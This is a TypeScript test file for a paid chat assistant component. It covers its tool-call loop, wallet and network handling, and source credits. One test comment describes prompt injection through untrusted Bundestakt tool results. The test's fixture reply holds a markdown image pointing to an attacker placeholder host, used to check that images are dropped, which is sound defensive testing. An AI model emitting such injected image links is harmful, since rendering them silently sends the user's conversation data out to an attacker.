/**
 * AssistantChat Component Tests
 *
 * Renders the real component and mocks useX402Chat / useWalletConnection /
 * useAutoNetwork (the SDK-level mocking already lives in useX402Chat.test.ts) —
 * this file is about UI behavior: typing, sending, message rendering, the
 * payment-receipt link, and error surfacing.
 */

import React from "react";
import { describe, it, expect, vi, beforeEach } from "vitest";
import { screen, fireEvent, waitFor, within } from "@testing-library/react";
import { renderWithQuery } from "./testUtils";

const mockSendMessage = vi.fn();
const mockConnectWallet = vi.fn();
const mockSwitchIfNeeded = vi.fn();
const mockSwitchImageIfNeeded = vi.fn();
const mockGenerateImage = vi.fn();
// vi.hoisted because the vi.mock factory below spreads these in immediately, rather than
// behind an inner closure like the hook mocks do — a plain const is still uninitialised then.
const { mockFetchSitzungen, mockFetchClaims, mockFetchStats } = vi.hoisted(() => ({
  mockFetchSitzungen: vi.fn(),
  mockFetchClaims: vi.fn(),
  mockFetchStats: vi.fn(),
}));

vi.mock("../hooks/useX402Chat", () => ({
  useX402Chat: vi.fn(() => ({
    sendMessage: mockSendMessage,
    status: "idle",
    error: null,
    paymentReceipt: null,
    reset: vi.fn(),
    isReady: true,
    paymentNetwork: "eip155:10",
  })),
  DEFAULT_LLM_AGENT_URL: "https://llm-agent.fretchen.eu",
}));

vi.mock("../hooks/useX402ImageGeneration", () => ({
  useX402ImageGeneration: vi.fn(() => ({
    generateImage: mockGenerateImage,
    status: "idle",
    error: null,
    paymentReceipt: null,
    reset: vi.fn(),
    isReady: true,
  })),
}));

vi.mock("../hooks/x402Discovery", () => ({
  fetchAgentCard: vi.fn(() => Promise.resolve(null)),
  precheckLlmV1Agent: vi.fn(() => Promise.resolve({ ok: false, reason: "nope" })),
}));

vi.mock("../hooks/useWalletConnection", () => ({
  useWalletConnection: vi.fn(() => ({
    address: "0x1234567890123456789012345678901234567890",
    hasMounted: true,
    isConnected: true,
    connectWallet: mockConnectWallet,
  })),
}));

// AssistantChat calls this twice — once for the chat network, once for the image tool's — so the
// mock must tell them apart rather than returning one shared switchIfNeeded for both. The chat
// call always passes exactly `[paymentNetwork]`; the image call passes the full mainnet GenAI
// list. Length is the discriminator: matching on a specific chain id silently stopped working
// once the image list changed from GENAI_NFT_NETWORKS to the mainnet-only subset.
const isImageNetworkCall = (supportedNetworks: readonly string[]) => supportedNetworks.length > 1;

vi.mock("../hooks/useAutoNetwork", () => ({
  useAutoNetwork: vi.fn((supportedNetworks: readonly string[]) =>
    supportedNetworks.length > 1
      ? { network: "eip155:10", isOnCorrectNetwork: true, switchIfNeeded: mockSwitchImageIfNeeded, switchError: null }
      : { network: "eip155:8453", isOnCorrectNetwork: true, switchIfNeeded: mockSwitchIfNeeded, switchError: null },
  ),
}));

vi.mock("../hooks/useUmami", () => ({
  useUmami: () => ({ trackEvent: vi.fn() }),
}));

vi.mock("../components/AgentInfoPanel", () => ({
  AgentInfoPanel: () => null,
}));

// Only the two fetchers are stubbed; the real selectors run against the Step 1 fixtures, so
// these tests cover the wiring *and* the actual projection rather than a hand-written stand-in.
vi.mock("../tools/bundestakt", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../tools/bundestakt")>();
  return { ...actual, fetchSitzungen: mockFetchSitzungen, fetchClaims: mockFetchClaims };
});

// Same treatment for analytics: real selector, stubbed fetcher.
vi.mock("../tools/analytics", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../tools/analytics")>();
  return { ...actual, fetchStats: mockFetchStats };
});

import { AssistantChat } from "../components/AssistantChat";
import { precheckLlmV1Agent } from "../hooks/x402Discovery";
import { useX402Chat } from "../hooks/useX402Chat";
import { useWalletConnection } from "../hooks/useWalletConnection";
import { useAutoNetwork } from "../hooks/useAutoNetwork";
import sitzungenFixture from "./fixtures/bundestakt/sitzungen.json";
import claimsFixture from "./fixtures/bundestakt/claims.json";
import { OWNER_SCOPES } from "../utils/getChain";

/** The first wallet with analytics scope — the scope `get_analytics` is gated on. */
const OWNER_ADDRESS = OWNER_SCOPES.analytics[0];

/** A tool-call turn, as sc_llm_x402 returns it: content: null, finish_reason: "tool_calls". */
function toolCallResponse(name: string, args: Record<string, unknown>) {
  return {
    choices: [
      {
        message: {
          role: "assistant",
          content: null,
          tool_calls: [{ id: "call_1", type: "function", function: { name, arguments: JSON.stringify(args) } }],
        },
        finish_reason: "tool_calls",
      },
    ],
  };
}

function textResponse(content: string) {
  return { choices: [{ message: { role: "assistant", content }, finish_reason: "stop" }] };
}

/** A minimal `Stats` payload — the real selectAnalytics runs against it. */
function statsFixture() {
  const to = new Date().toISOString().slice(0, 10);
  return {
    site: "fretchen.eu",
    from: to,
    to,
    days: { [to]: { hits: 42, landings: 12, pages: { "/blog/hello": 30, "/": 12 }, source: "beacon" } },
  };
}

/** The chat's default mocked wallet is NOT the owner; this is what flips the owner-only tools on. */
function connectAsOwner() {
  vi.mocked(useWalletConnection).mockReturnValue({
    address: OWNER_ADDRESS,
    hasMounted: true,
    isConnected: true,
    connectWallet: mockConnectWallet,
  });
}

function sendUserMessage(text: string) {
  fireEvent.change(screen.getByPlaceholderText("assistent.placeholder"), { target: { value: text } });
  fireEvent.click(screen.getByRole("button", { name: /assistent\.send/ }));
}

describe("AssistantChat", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    // The component reads two preferences from localStorage (network, disabled tools). Without
    // this, a case that sets one leaks into every case after it.
    window.localStorage.clear();
    mockSwitchIfNeeded.mockResolvedValue(true);
    mockSwitchImageIfNeeded.mockResolvedValue(true);
    mockFetchSitzungen.mockResolvedValue(sitzungenFixture);
    mockFetchClaims.mockResolvedValue(claimsFixture);
    mockFetchStats.mockResolvedValue(statsFixture());
    mockSendMessage.mockResolvedValue({
      choices: [{ message: { role: "assistant", content: "Paris is the capital of France." } }],
    });
    vi.mocked(useX402Chat).mockReturnValue({
      sendMessage: mockSendMessage,
      status: "idle",
      error: null,
      paymentReceipt: null,
      reset: vi.fn(),
      isReady: true,
      paymentNetwork: "eip155:10",
    });
    vi.mocked(useWalletConnection).mockReturnValue({
      address: "0x1234567890123456789012345678901234567890",
      hasMounted: true,
      isConnected: true,
      connectWallet: mockConnectWallet,
    });
    // useAutoNetwork's own factory (above) already discriminates chat vs. image calls by
    // argument; nothing to override here for the default happy-path case.
  });

  it("sends the full conversation as the prompt, including the system prompt", async () => {
    renderWithQuery(<AssistantChat />);

    sendUserMessage("What is the capital of France?");

    await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());

    const prompt = mockSendMessage.mock.calls[0][0] as { role: string; content: string }[];
    expect(prompt[0]).toEqual({ role: "system", content: "assistent.systemPrompt" });
    expect(prompt[prompt.length - 1]).toEqual({ role: "user", content: "What is the capital of France?" });
  });

  it("renders the assistant's reply as a message bubble", async () => {
    renderWithQuery(<AssistantChat />);

    sendUserMessage("What is the capital of France?");

    await waitFor(() => {
      expect(screen.getByText("Paris is the capital of France.")).toBeInTheDocument();
    });
  });

  it("falls back to the no-response message when the model returns empty content", async () => {
    // Mistral can return content: "" with finish_reason: "stop" — a real, non-nullish empty
    // completion. `??` alone doesn't catch it, and used to render a literally blank bubble.
    mockSendMessage.mockResolvedValueOnce(textResponse(""));

    renderWithQuery(<AssistantChat />);
    sendUserMessage("Draw a dog playing piano");

    await waitFor(() => {
      expect(screen.getByText("assistent.noResponse")).toBeInTheDocument();
    });
  });

  it("says it is topping up rather than typing while the channel refills", async () => {
    // A drained channel self-heals mid-send (useX402Chat), which costs a wallet signature. Saying
    // so is what keeps that prompt from arriving unexplained.
    vi.mocked(useX402Chat).mockReturnValue({
      sendMessage: mockSendMessage,
      status: "topping-up",
      error: null,
      paymentReceipt: null,
      reset: vi.fn(),
      isReady: true,
      paymentNetwork: "eip155:10",
    });
    mockSendMessage.mockImplementation(() => new Promise(() => {})); // never resolves: stay loading

    renderWithQuery(<AssistantChat />);
    sendUserMessage("Hi");

    await waitFor(() => {
      expect(screen.getByText("assistent.toppingUp")).toBeInTheDocument();
    });
    expect(screen.queryByText("assistent.typing")).not.toBeInTheDocument();
  });

  it("switches the network before paying", async () => {
    renderWithQuery(<AssistantChat />);

    sendUserMessage("Hi");

    await waitFor(() => expect(mockSwitchIfNeeded).toHaveBeenCalledOnce());
    expect(mockSendMessage).toHaveBeenCalled();
  });

  it("shows an error bubble with the real switch-failure reason instead of a generic message", async () => {
    mockSwitchIfNeeded.mockResolvedValue(false);
    vi.mocked(useAutoNetwork).mockImplementation((supportedNetworks: readonly string[]) =>
      isImageNetworkCall(supportedNetworks)
        ? { network: "eip155:10", isOnCorrectNetwork: true, switchIfNeeded: mockSwitchImageIfNeeded, switchError: null }
        : {
            network: "eip155:8453",
            isOnCorrectNetwork: false,
            switchIfNeeded: mockSwitchIfNeeded,
            switchError: "Unrecognized chain ID, please add it in your wallet first",
          },
    );

    renderWithQuery(<AssistantChat />);

    sendUserMessage("Hi");

    await waitFor(() => {
      expect(screen.getByText(/Unrecognized chain ID, please add it in your wallet first/)).toBeInTheDocument();
    });
    expect(mockSendMessage).not.toHaveBeenCalled();
  });

  it("does not call sendMessage when the wallet is disconnected, and prompts connect instead", () => {
    vi.mocked(useWalletConnection).mockReturnValue({
      address: undefined,
      hasMounted: true,
      isConnected: false,
      connectWallet: mockConnectWallet,
    });

    renderWithQuery(<AssistantChat />);

    fireEvent.change(screen.getByPlaceholderText("assistent.placeholder"), { target: { value: "Hi" } });
    fireEvent.click(screen.getByRole("button", { name: /connectWalletMessage/ }));

    expect(mockConnectWallet).toHaveBeenCalledWith("assistant-v2", expect.objectContaining({ hasInput: true }));
    expect(mockSendMessage).not.toHaveBeenCalled();
  });

  it("renders a network-aware payment receipt link after a successful message", async () => {
    vi.mocked(useX402Chat).mockReturnValue({
      sendMessage: mockSendMessage,
      status: "success",
      error: null,
      paymentReceipt: { transaction: "0xdeposit", network: "eip155:8453" },
      reset: vi.fn(),
      isReady: true,
      paymentNetwork: "eip155:8453",
    });

    renderWithQuery(<AssistantChat />);

    const link = screen.getByRole("link", { name: /assistent\.viewPayment/ });
    expect(link).toHaveAttribute("href", "https://basescan.org/tx/0xdeposit");
  });

  it("does not render a payment receipt link before any payment has settled", () => {
    renderWithQuery(<AssistantChat />);

    expect(screen.queryByRole("link", { name: /assistent\.viewPayment/ })).not.toBeInTheDocument();
  });

  it("drops markdown images from the assistant's reply, but keeps links", async () => {
    // Untrusted third-party text reaches the model through the Bundestakt tool results, which
    // run with no confirmation step, and the system prompt asks the model to echo their urls. A
    // markdown image fetches itself the moment it renders, so an injected
    // `![](https://attacker/?q=…)` would exfiltrate on sight; a link needs a click. See the
    // comment at the ReactMarkdown call site in AssistantChat.tsx.
    mockSendMessage.mockResolvedValueOnce(
      textResponse("Look: ![x](https://evil.example/p.png) and [a source](https://bundestakt.de/s)"),
    );

    const { container } = renderWithQuery(<AssistantChat />);
    sendUserMessage("What happened in the Bundestag?");

    await waitFor(() => {
      expect(screen.getByRole("link", { name: "a source" })).toBeInTheDocument();
    });
    expect(container.querySelector("img")).toBeNull();
  });

  describe("tool-call loop", () => {
    it("shows a confirm card pre-filled from the model's tool call, and never auto-executes", async () => {
      mockSendMessage.mockResolvedValueOnce(
        toolCallResponse("generate_image", { prompt: "a red bicycle on a beach", size: "1024x1024" }),
      );

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw me a red bicycle on a beach");

      await waitFor(() => {
        expect(screen.getByDisplayValue("a red bicycle on a beach")).toBeInTheDocument();
      });
      // Never auto-executes: the card must appear and generateImage must NOT have run yet.
      expect(mockGenerateImage).not.toHaveBeenCalled();
    });

    it("clicking Generate calls generateImage with the (possibly edited) prompt/size, then renders the image", async () => {
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "original prompt", size: "1024x1024" }))
        .mockResolvedValueOnce(textResponse("Here is your image!"));
      mockGenerateImage.mockResolvedValue({ imageUrl: "https://example.com/generated.png" });

      const { container } = renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw me something");

      const promptBox = await screen.findByDisplayValue("original prompt");
      fireEvent.change(promptBox, { target: { value: "an edited prompt" } });
      fireEvent.click(screen.getByRole("button", { name: /1792x1024/ }));
      fireEvent.click(screen.getByRole("button", { name: /assistent\.toolConfirmGenerate/ }));

      await waitFor(() => {
        expect(mockGenerateImage).toHaveBeenCalledWith(
          expect.objectContaining({ prompt: "an edited prompt", size: "1792x1024", isListed: false }),
        );
      });
      await waitFor(() => {
        expect(screen.getByText("Here is your image!")).toBeInTheDocument();
      });
      // alt="" is deliberate (decorative, inline with its own caption text), which excludes it
      // from the accessibility tree's "img" role — hence a DOM query rather than getByRole.
      expect(container.querySelector("img")).toHaveAttribute("src", "https://example.com/generated.png");
      // The card is gone once the loop resolves.
      expect(screen.queryByDisplayValue("an edited prompt")).not.toBeInTheDocument();
    });

    it("clicking Cancel sends a user_declined tool result and the loop continues", async () => {
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "a cat", size: "1024x1024" }))
        .mockResolvedValueOnce(textResponse("No problem, let me know if you change your mind."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw a cat");

      await screen.findByDisplayValue("a cat");
      fireEvent.click(screen.getByRole("button", { name: /assistent\.cancel$/ }));

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
      expect(mockGenerateImage).not.toHaveBeenCalled();
      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const toolResult = secondConvo.find((m) => m.role === "tool");
      expect(toolResult && (JSON.parse(toolResult.content) as { status: string }).status).toBe("user_declined");
    });

    it("stops offering the failed tool, while leaving the others on offer", async () => {
      // A real conversation burned all three hops re-requesting an image that kept failing: three
      // wallet prompts, three paid attempts, and the generic no-response fallback because no hop
      // ever produced text. Withdrawing just that tool is what forces the answer — and unlike the
      // old tool_choice: "none", it leaves the free Bundestakt lookups usable in the same turn.
      const consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("generate_image", { prompt: "a cat", size: "1024x1024" }))
        .mockResolvedValueOnce(textResponse("That didn't work — your wallet is out of USDC."));
      mockGenerateImage.mockRejectedValue(new Error("Request failed: 402 - insufficient allowance"));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw a cat");

      await screen.findByDisplayValue("a cat");
      fireEvent.click(screen.getByRole("button", { name: /assistent\.toolConfirmGenerate/ }));

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));

      // First hop offers all three tools; the hop after the failure drops generate_image only.
      const offeredNames = (i: number) =>
        ((mockSendMessage.mock.calls[i][1] as { tools: { function: { name: string } }[] }).tools ?? []).map(
          (t) => t.function.name,
        );
      expect(offeredNames(0)).toContain("generate_image");
      expect(offeredNames(1)).not.toContain("generate_image");
      expect(offeredNames(1)).toEqual(expect.arrayContaining(["get_sitzungen", "search_claims"]));
      // One confirmation, one paid attempt — not one per hop.
      expect(mockGenerateImage).toHaveBeenCalledTimes(1);

      await waitFor(() => {
        expect(screen.getByText(/out of USDC/)).toBeInTheDocument();
      });

      consoleError.mockRestore();
    });

    it("keeps offering a tool after not_found, so the model can retry with a corrected slug", async () => {
      // The system prompt tells the model to call get_sitzungen twice: once without a slug to
      // list sessions, once with the chosen slug for details. A wrong slug on the second call is
      // a normal, recoverable outcome — unlike a real failure, it must not withdraw the tool.
      const goodSlug = (sitzungenFixture.sitzungen[0] as { slug: string }).slug;
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug: "not-a-real-slug" }))
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug: goodSlug }))
        .mockResolvedValueOnce(textResponse("Here is what happened in that session."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Tell me about that session");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(3));

      // The bad slug came back not_found (asserted via the tool result below), yet hop 2 still
      // offers get_sitzungen — that is the fix.
      const offeredNames = (i: number) =>
        ((mockSendMessage.mock.calls[i][1] as { tools?: { function: { name: string } }[] }).tools ?? []).map(
          (t) => t.function.name,
        );
      expect(offeredNames(1)).toContain("get_sitzungen");

      const firstConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const firstToolResult = firstConvo.find((m) => m.role === "tool");
      expect(JSON.parse(firstToolResult!.content)).toEqual({ status: "not_found" });

      await waitFor(() => {
        expect(screen.getByText("Here is what happened in that session.")).toBeInTheDocument();
      });
    });

    it("stops after MAX_HOPS and captions the image it did generate", async () => {
      // The model never produced a closing sentence, but the user approved and paid for the
      // images and they are on screen — so the bubble must not read "No response received".
      mockSendMessage.mockResolvedValue(toolCallResponse("generate_image", { prompt: "x", size: "1024x1024" }));
      mockGenerateImage.mockResolvedValue({ imageUrl: "https://example.com/x.png" });

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw x");

      // Auto-confirm every card the loop opens, until it gives up.
      for (let i = 0; i < 4; i++) {
        const generateButton = await screen.findByRole("button", { name: /assistent\.toolConfirmGenerate/ });
        fireEvent.click(generateButton);
        await waitFor(() => expect(mockGenerateImage).toHaveBeenCalledTimes(i + 1));
      }

      await waitFor(() => {
        expect(screen.getByText("assistent.imageReady")).toBeInTheDocument();
      });
      expect(screen.queryByText("assistent.noResponse")).not.toBeInTheDocument();
      expect(mockSendMessage).toHaveBeenCalledTimes(4); // MAX_HOPS, no 5th attempt
      expect(mockGenerateImage).toHaveBeenCalledTimes(4);
    });

    it("still says no-response when the hops run out without an image", async () => {
      // The other side of the caption branch. Withdrawing a tool after the first decline stops us
      // offering it, but an upstream that keeps asking for it anyway burns every hop — and with
      // nothing generated there is nothing to caption.
      mockSendMessage.mockResolvedValue(toolCallResponse("generate_image", { prompt: "x", size: "1024x1024" }));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Draw x");

      for (let i = 0; i < 4; i++) {
        const cancelButton = await screen.findByRole("button", { name: "assistent.cancel" });
        fireEvent.click(cancelButton);
        await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(i + 1));
      }

      await waitFor(() => {
        expect(screen.getByText("assistent.noResponse")).toBeInTheDocument();
      });
      expect(mockGenerateImage).not.toHaveBeenCalled();
    });

    it("runs a Bundestakt lookup silently — no confirm card — and feeds the result back", async () => {
      // Unlike generate_image, these are free and read-only, so gating them behind a wallet-style
      // confirmation would be friction with nothing to protect.
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
        .mockResolvedValueOnce(textResponse("The last session was about the 2027 budget."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("What was the last Bundestag session about?");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
      expect(screen.queryByRole("button", { name: /assistent\.toolConfirmGenerate/ })).not.toBeInTheDocument();
      expect(mockFetchSitzungen).toHaveBeenCalledTimes(1);

      // The projected result reaches the model as a role: "tool" turn.
      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const toolResult = secondConvo.find((m) => m.role === "tool");
      expect(toolResult).toBeDefined();
      const parsed = JSON.parse(toolResult!.content) as { status: string; sitzungen: unknown[] };
      expect(parsed.status).toBe("ok");
      expect(parsed.sitzungen.length).toBeGreaterThan(0);
    });

    it("fetches each Bundestakt endpoint once per turn, even across hops", async () => {
      // The intended flow calls /sitzungen twice — list, then the chosen slug. That dump is 71 KB
      // (claims is 912 KB), so the per-turn cache is the difference between one download and two.
      const slug = (sitzungenFixture.sitzungen[0] as { slug: string }).slug;
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", { slug }))
        .mockResolvedValueOnce(textResponse("Here is what happened."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Tell me about the last session in detail");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(3));
      expect(mockFetchSitzungen).toHaveBeenCalledTimes(1);
    });

    it("keeps the image tool on offer when a Bundestakt lookup fails", async () => {
      // The regression this guards: a single shared `toolFailed` flag would have disabled
      // generate_image for the rest of the turn because an unrelated, free lookup failed.
      mockFetchClaims.mockRejectedValue(new Error("Failed to fetch"));
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("search_claims", { query: "rente" }))
        .mockResolvedValueOnce(textResponse("I could not reach the fact-check database."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Did anyone lie about pensions?");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));

      const offered = (mockSendMessage.mock.calls[1][1] as { tools: { function: { name: string } }[] }).tools;
      const names = offered.map((t) => t.function.name);
      expect(names).toContain("generate_image");
      expect(names).not.toContain("search_claims");
    });

    it("omits the tools key entirely once every tool has failed", async () => {
      // `[]` is truthy and useX402Chat spreads `tools` in on truthiness, so an empty array would
      // be sent as `tools: []`. "Nothing left to offer" has to mean the key is absent.
      mockFetchSitzungen.mockRejectedValue(new Error("down"));
      mockFetchClaims.mockRejectedValue(new Error("down"));

      // All three in one hop: the two lookups fail on their own, the image tool via a cancel.
      mockSendMessage.mockResolvedValue({
        choices: [
          {
            message: {
              role: "assistant",
              content: null,
              tool_calls: [
                { id: "a", type: "function", function: { name: "get_sitzungen", arguments: "{}" } },
                { id: "b", type: "function", function: { name: "search_claims", arguments: "{}" } },
                { id: "c", type: "function", function: { name: "generate_image", arguments: "{}" } },
              ],
            },
            finish_reason: "tool_calls",
          },
        ],
      });

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Everything is broken");

      const cancelButton = await screen.findByRole("button", { name: "assistent.cancel" });
      fireEvent.click(cancelButton);

      await waitFor(() => expect(mockSendMessage.mock.calls.length).toBeGreaterThanOrEqual(2));

      const secondCallOptions = mockSendMessage.mock.calls[1][1] as Record<string, unknown>;
      expect(secondCallOptions.tools).toBeUndefined();
      expect("tools" in secondCallOptions && secondCallOptions.tools !== undefined).toBe(false);
    });

    it("answers unknown_tool for a name the model invented, without crashing the turn", async () => {
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_weather", { city: "Berlin" }))
        .mockResolvedValueOnce(textResponse("I cannot check the weather."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("What's the weather?");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const toolResult = secondConvo.find((m) => m.role === "tool");
      expect(JSON.parse(toolResult!.content)).toEqual({ status: "unknown_tool" });

      await waitFor(() => expect(screen.getByText("I cannot check the weather.")).toBeInTheDocument());
    });

    it("credits Bundestakt after a successful lookup, but not after a failed one", async () => {
      // CC BY 4.0 requires naming and linking the source, so this line is a licence obligation.
      // It is equally an honesty requirement not to show it when nothing was actually retrieved.
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
        .mockResolvedValueOnce(textResponse("The budget was the main topic."));

      const { unmount } = renderWithQuery(<AssistantChat />);
      sendUserMessage("What happened?");
      await waitFor(() => expect(screen.getByText("assistent.bundestaktSource")).toBeInTheDocument());
      unmount();

      vi.clearAllMocks();
      mockSwitchIfNeeded.mockResolvedValue(true);
      mockFetchSitzungen.mockRejectedValue(new Error("Failed to fetch"));
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
        .mockResolvedValueOnce(textResponse("I could not reach Bundestakt."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("What happened?");

      await waitFor(() => expect(screen.getByText("I could not reach Bundestakt.")).toBeInTheDocument());
      expect(screen.queryByText("assistent.bundestaktSource")).not.toBeInTheDocument();
    });

    // The ToolSelector persists the *disabled* names, so a tool added later is on by default and
    // an existing user notices nothing. These cases check that the stored set actually reaches the
    // request the loop builds.
    it("offers every tool when nothing has been switched off", async () => {
      renderWithQuery(<AssistantChat />);
      sendUserMessage("Hi");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());
      const offered = (mockSendMessage.mock.calls[0][1] as { tools: { function: { name: string } }[] }).tools;
      expect(offered.map((t) => t.function.name)).toEqual(
        expect.arrayContaining(["generate_image", "get_sitzungen", "search_claims"]),
      );
    });

    it("withholds a tool the user switched off, and keeps the rest", async () => {
      window.localStorage.setItem("x402-chat-disabled-tools", "generate_image");

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Hi");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());
      const names = (mockSendMessage.mock.calls[0][1] as { tools: { function: { name: string } }[] }).tools.map(
        (t) => t.function.name,
      );
      expect(names).not.toContain("generate_image");
      expect(names).toEqual(expect.arrayContaining(["get_sitzungen", "search_claims"]));
    });

    // `[]` is truthy and useX402Chat spreads `tools` in on truthiness — the same trap the owner
    // gate has. "Nothing selected" has to mean the key is absent.
    it("omits the tools key entirely when the user switched everything off", async () => {
      window.localStorage.setItem(
        "x402-chat-disabled-tools",
        "generate_image,get_sitzungen,search_claims,get_analytics",
      );

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Hi");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());
      expect((mockSendMessage.mock.calls[0][1] as { tools?: unknown[] }).tools).toBeUndefined();
    });

    it("ignores a stored name that is no longer a tool", async () => {
      window.localStorage.setItem("x402-chat-disabled-tools", "a_tool_we_removed");

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Hi");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());
      const offered = (mockSendMessage.mock.calls[0][1] as { tools: { function: { name: string } }[] }).tools;
      expect(offered.map((t) => t.function.name)).toEqual(
        expect.arrayContaining(["generate_image", "get_sitzungen", "search_claims"]),
      );
    });

    it("switching a tool off in the panel persists and reaches the next request", async () => {
      renderWithQuery(<AssistantChat />);

      fireEvent.click(screen.getAllByLabelText("Bundestag sessions")[0]);
      expect(window.localStorage.getItem("x402-chat-disabled-tools")).toBe("get_sitzungen");

      sendUserMessage("Hi");
      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());
      const names = (mockSendMessage.mock.calls[0][1] as { tools: { function: { name: string } }[] }).tools.map(
        (t) => t.function.name,
      );
      expect(names).not.toContain("get_sitzungen");
    });

    it("does not list an owner-only tool in the panel for a visitor", () => {
      renderWithQuery(<AssistantChat />);
      expect(screen.queryByLabelText("Site analytics")).not.toBeInTheDocument();
      expect(screen.getAllByLabelText("Image generation").length).toBeGreaterThan(0);
    });

    it("does not offer the analytics tool to a visitor who is not the owner", async () => {
      // /stats answers 401 to anyone else, so offering it would burn a hop on a guaranteed
      // failure — and would put its description in front of the model for people it cannot serve.
      renderWithQuery(<AssistantChat />);
      sendUserMessage("How is the site doing?");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledOnce());
      const offered = (mockSendMessage.mock.calls[0][1] as { tools: { function: { name: string } }[] }).tools;
      expect(offered.map((t) => t.function.name)).not.toContain("get_analytics");
      // The other tools are unaffected by the gate.
      expect(offered.map((t) => t.function.name)).toEqual(
        expect.arrayContaining(["generate_image", "get_sitzungen", "search_claims"]),
      );
    });

    it("offers the analytics tool to the owner and credits the source", async () => {
      connectAsOwner();
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_analytics", { range: "30d" }))
        .mockResolvedValueOnce(textResponse("Your best page was /blog/hello."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Which pages did best?");

      await waitFor(() => expect(mockSendMessage).toHaveBeenCalledTimes(2));
      const offered = (mockSendMessage.mock.calls[0][1] as { tools: { function: { name: string } }[] }).tools;
      expect(offered.map((t) => t.function.name)).toContain("get_analytics");

      // Read-only and free, so no confirmation card — but the source is named afterwards.
      expect(screen.queryByRole("button", { name: /assistent\.toolConfirmGenerate/ })).not.toBeInTheDocument();
      expect(mockFetchStats).toHaveBeenCalledTimes(1);
      await waitFor(() => expect(screen.getByText("assistent.analyticsSource")).toBeInTheDocument());

      // The real selector ran: the projected figures reach the model.
      const secondConvo = mockSendMessage.mock.calls[1][0] as { role: string; content: string }[];
      const toolResult = secondConvo.find((m) => m.role === "tool");
      const parsed = JSON.parse(toolResult!.content) as { status: string; totalHits: number };
      expect(parsed.status).toBe("ok");
      expect(parsed.totalHits).toBe(42);
    });

    it("does not credit analytics when the lookup failed", async () => {
      connectAsOwner();
      mockFetchStats.mockRejectedValue(new Error("Failed to fetch"));
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_analytics", {}))
        .mockResolvedValueOnce(textResponse("I could not read the analytics."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("How is the site doing?");

      await waitFor(() => expect(screen.getByText("I could not read the analytics.")).toBeInTheDocument());
      expect(screen.queryByText("assistent.analyticsSource")).not.toBeInTheDocument();
    });

    it("names both sources when one turn used both", async () => {
      connectAsOwner();
      mockSendMessage
        .mockResolvedValueOnce(toolCallResponse("get_sitzungen", {}))
        .mockResolvedValueOnce(toolCallResponse("get_analytics", {}))
        .mockResolvedValueOnce(textResponse("Here is both."));

      renderWithQuery(<AssistantChat />);
      sendUserMessage("Sessions and traffic please");

      await waitFor(() => expect(screen.getByText("Here is both.")).toBeInTheDocument());
      expect(screen.getByText("assistent.bundestaktSource")).toBeInTheDocument();
      expect(screen.getByText("assistent.analyticsSource")).toBeInTheDocument();
    });

    it("never offers the image tool a testnet network", async () => {
      // useAutoNetwork keeps the wallet's current chain whenever it is in the supported list, so
      // a testnet entry here would let a wallet left on Sepolia silently generate a placeholder
      // image against the testnet mock — while the chat, which is mainnet-only, had already
      // taken a real USDC deposit. The image tool has no visible network picker to catch it.
      renderWithQuery(<AssistantChat />);

      const imageCall = vi
        .mocked(useAutoNetwork)
        .mock.calls.map(([networks]) => networks)
        .find(isImageNetworkCall);

      expect(imageCall).toBeDefined();
